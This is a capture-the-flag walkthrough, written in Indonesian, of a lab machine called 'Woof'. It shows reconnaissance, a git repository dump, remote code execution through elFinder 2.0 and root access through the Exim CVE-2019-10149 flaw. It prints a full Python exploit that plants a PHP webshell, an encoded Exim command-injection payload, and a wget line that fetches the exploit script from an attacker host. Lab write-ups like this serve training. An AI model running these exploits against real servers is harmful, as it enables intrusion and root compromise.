**Platform:** HacKtrace  
**Difficulty:** Hard  
**Target:** 10.1.2.124  
**Author:** greed

---

## Deskripsi

Machine "Woof" merupakan tantangan kategori hard yang melibatkan serangkaian teknik eksploitasi mulai dari information disclosure, remote code execution melalui elFinder, hingga privilege escalation via kerentanan Exim.

---

## Reconnaissance

### Port Scanning


```bash
rustscan -a 10.1.2.124 --ulimit 1000 -r 1-65535 -- -A -sC -Pn
```

**Hasil:**

```
80/tcp open  http  syn-ack  Woof!!
```

Hanya port 80 yang terbuka. Web server menjalankan aplikasi dengan dua direktori utama:

|Path|Aplikasi|
|---|---|
|`/dev`|Script Compressor (Node.js + AngularJS)|
|`/news`|Joomla CMS|

---

## Information Disclosure

### Konfigurasi Terekspos

Melalui directory enumeration ditemukan file konfigurasi sensitif yang dapat diakses publik:

```
http://10.1.2.124/dev/conf/ioc.conf.json
```


```json
{
    "defaultLang": "en",
    "port": 8080,
    "app": {
        "dev": false,
        "devUrl": "http://hop.home.local",
        "url": "http://hop.net-tomorrow.com/"
    },
    "mysql": {
        "host": "localhost",
        "user": "root",
        "password": "",
        "database": "houseofpink",
        "multipleStatements": true
    },
    "mongoDB": {
        "url": "localhost/dekoho"
    }
}
```

**Temuan kritis:**

- MySQL berjalan sebagai `root` tanpa password
- `multipleStatements: true` mengindikasikan potensi SQL Injection
- Terdapat dua virtual host: `hop.home.local` dan `hop.net-tomorrow.com`

---

## Git Repository Disclosure

### Menemukan .git Exposed

Melalui feroxbuster dengan penambahan `.git` pada wordlist:

bash

```bash
echo ".git" >> /home/greed/SecLists-master/Discovery/Web-Content/directory-list-2.3-small.txt

feroxbuster -u http://10.1.2.124 --redirects \
  -w /home/greed/SecLists-master/Discovery/Web-Content/directory-list-2.3-small.txt \
  -t 50
```

Ditemukan:

```
http://10.1.2.124/dev/.git/HEAD
```

### Dump Repository

```bash
git-dumper http://10.1.2.124/dev/.git ./dumped_repo
```

### Analisis Repository

```bash
strings .git/index | grep -iE "flag|secret|token|key|admin|config|php|pass|root|ssh"
```

**Temuan penting dari index:**

```
js/elfinder2.0/php/connector.minimal.php
js/elfinder2.0/php/connector.php
js/elfinder2.0/php/elFinder.class.php
js/elfinder2.0/files/Documents/passwords.txt
```

Aplikasi menggunakan **elFinder 2.0** — file manager PHP yang memiliki kerentanan RCE.

Selain itu, dari `config` diketahui repo merupakan clone dari:

```
https://github.com/mbouclas/minifier.git
```

---

## Foothold: elFinder RCE

### CVE yang Digunakan

**elFinder 2.0 - Remote Command Execution via File Creation**  
_Author: TUNISIAN CYBER (2015)_  
_EDB: [https://www.exploit-db.com/exploits/36177](https://www.exploit-db.com/exploits/36177)_

### Verifikasi Endpoint


```bash
curl "http://10.1.2.124/dev/js/elfinder2.0/php/connector.minimal.php?cmd=init"
```

Server merespons — endpoint aktif.

### Script Eksploitasi (Python 3)

Script dimodifikasi dari exploit original untuk menyesuaikan lingkungan target:


```python
import urllib.request
import urllib.parse
import http.cookiejar
import sys
import os
import base64

host = input('  Vulnerable Site: ')
evilfile = input('  EvilFileName: ')
path = input('  elFinder Path: ')


if not os.path.exists(evilfile):
    print(f"[-] File {evilfile} tidak ditemukan!")
    sys.exit(1)


with open(evilfile, 'r') as f:
    shell_content = f.read()

tcyber = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(tcyber))


create = opener.open(
    f'http://{host}/dev/js/elfinder2.0/php/connector.minimal.php'
    f'?cmd=mkfile&name={evilfile}&target=l1_Lw'
)
print("Create:", create.read())


target = 'l1_' + base64.b64encode(evilfile.encode()).decode().strip()

payload = urllib.parse.urlencode({
    'cmd': 'put',
    'target': target,
    'content': shell_content
}).encode()

write = opener.open(
    f'http://{host}/dev/js/elfinder2.0/php/connector.minimal.php',
    payload
)
print("Write:", write.read())


while True:
    try:
        cmd = input('[She3LL]:~# ')
        if cmd.strip() == 'exit':
            break
        execute = opener.open(
            f'http://{host}/dev/js/elfinder2.0/files/{evilfile}'
            f'?cmd={urllib.parse.quote(cmd)}'
        )
        print(execute.read().decode())
    except Exception as e:
        print("Error:", e)
        break
```

### Eksekusi


```bash
# Buat webshell
echo '<?php system($_GET["cmd"]); ?>' > greed2.php

# Jalankan exploit
python3 elfinder.py
#   Vulnerable Site: 10.1.2.124
#   EvilFileName: greed2.php
#   elFinder Path: dev/js/elfinder2.0
```

**Hasil:**

```
[She3LL]:~# whoami
www-data
```

RCE berhasil sebagai `www-data`.

---

## Privilege Escalation

### Enumerasi SUID


```bash
find / -perm -4000 -type f 2>/dev/null
```

**Temuan kritis:**

```
/usr/exim/bin/exim-4.89-2
/usr/exim/bin/exim-4.89-4
/usr/exim/bin/exim-4.89-6
/usr/exim/bin/exim-4.89-8
/usr/exim/bin/exim-4.89-10
/usr/exim/bin/exim-4.91-4    ← Vulnerable!
```

### CVE yang Digunakan

**CVE-2019-10149 - Exim "Return of the WIZard" Local Privilege Escalation**  
_Ditemukan oleh: Qualys Security Advisory Team_  
_EDB: [https://www.exploit-db.com/exploits/46996](https://www.exploit-db.com/exploits/46996)_

Exim versi 4.87–4.91 rentan terhadap improper validation pada fungsi `deliver_message()` yang memungkinkan eksekusi perintah arbitrary sebagai root.

### Script Eksploitasi

Script dimodifikasi untuk menyalin `root.txt` langsung ke direktori web yang dapat diakses:

```bash
#!/bin/bash

PAYLOAD_SETUID='${run{\x2Fbin\x2Fbash\t-c\t\x22cp\t\x2Froot\x2Froot.txt\t\x2Fvar\x2Fwww\x2Fhtml\x2Fdev\x2Fjs\x2Felfinder2.0\x2Ffiles\x2Froot.txt\x26\x26\tchmod\t777\t\x2Fvar\x2Fwww\x2Fhtml\x2Fdev\x2Fjs\x2Felfinder2.0\x2Ffiles\x2Froot.txt\x22}}@localhost'

PAYLOAD=$PAYLOAD_SETUID

exec 3<>/dev/tcp/localhost/25
read -u 3 && echo $REPLY
echo "helo localhost" >&3
read -u 3 && echo $REPLY
echo "mail from:<>" >&3
read -u 3 && echo $REPLY
echo "rcpt to:<$PAYLOAD>" >&3
read -u 3 && echo $REPLY
echo "data" >&3
read -u 3 && echo $REPLY
for i in {1..31}; do
    echo "Received: $i" >&3
done
echo "." >&3
read -u 3 && echo $REPLY
echo "quit" >&3
read -u 3 && echo $REPLY

echo "Waiting 5 seconds..."
sleep 5
```

### Upload dan Eksekusi


```bash
# Upload via She3LL
[She3LL]:~# wget http://<ATTACKER_IP>/exim.sh -O /tmp/exim.sh
[She3LL]:~# chmod +x /tmp/exim.sh
[She3LL]:~# bash /tmp/exim.sh
```